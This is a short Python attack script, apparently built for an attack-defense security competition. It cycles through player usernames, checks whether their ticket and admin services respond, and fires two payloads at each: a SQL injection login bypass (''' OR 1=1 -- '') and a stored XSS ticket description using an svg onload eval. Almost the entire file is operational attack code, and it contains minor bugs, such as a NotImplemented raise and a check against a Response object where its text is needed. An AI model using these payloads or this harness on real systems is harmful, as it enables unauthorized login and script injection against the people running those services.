import requests as reqs
import urllib3.exceptions

XSS_KEY = 'abcd'
usernames = ['Fromage', 'Samdaman']


class Attack:
    def run(self, un: str):
        raise NotImplemented
    def log(self, s: str) -> None:
        print(f'----- {self.__class__.__name__} - {s}')


def main():
    attacks = [SqlAttack1(), XSSAttack1()]
    for un in usernames:
        print('\n------------------------------')
        [check_up(un, i) for i in [True, False]]
        for attack in attacks:
            try:
                attack.run(un)
            except Exception as e:
                print(f'Error running attack {attack.__class__}\n{e}')


def check_up(un: str, admin: bool) -> bool:
    try:
        if admin:
            res = reqs.get(url_admin(un))
        else:
            res = reqs.get(url_tickets(un))
        print(f'{"ADMIN" if admin else "TICKETS"} {un} is up with code {res.status_code}')
        return True
    except Exception as e:
        if len(e.args) > 0:
            if isinstance(e.args[0], urllib3.exceptions.MaxRetryError):
                print(f'{"ADMIN" if admin else "TICKETS"} {un} appears down')
            else:
                print(f'{"ADMIN" if admin else "TICKETS"} {un} unknown error {e.args[0][:20]}')
        else:
            print(f'{"ADMIN" if admin else "TICKETS"} {un} unspecified error')
    return False


class SqlAttack1(Attack):
    def _check(self, un) -> bool:
        return True
    def run(self, un):
        if not self._check(un):
            return
        data = {
            'name': 'sam',
            'password': "' OR 1=1 -- "
        }
        res = reqs.post(f'{url_tickets(un)}/login', data=data)
        if res.status_code == 200:
            self.log('exploited')
        else:
            self.log(f'error, got code {res.status_code}')


class XSSAttack1(Attack):
    def _check(self, un) -> bool:
        return XSS_KEY not in reqs.get(f'{url_tickets(un)}/all_tickets')
    def run(self, un):
        if not self._check(un):
            return
        payload = f'<svg onload=eval("window.{XSS_KEY}=1")>'
        data = {
            'name': 'cool ticket',
            'descr': payload
        }
        reqs.post(f'{url_tickets(un)}/new', data=data)
        if self._check(un):
            self.log('didnt work')
        else:
            self.log('seemed to work')


class NewAttack(Attack):
    def _check(self, un) -> bool:
        return True
    def run(self, un):
        if not self._check(un):
            return
        pass


url_tickets = lambda un: 'http://localhost:8080'
# url_tickets = lambda un: f'https://{un}.cybersecuritychallenge-finale.nz/tickets'
url_admin = lambda un: f'https://{un}.cybersecuritychallenge-finale.nz/admin'

if __name__ == '__main__':
    main()
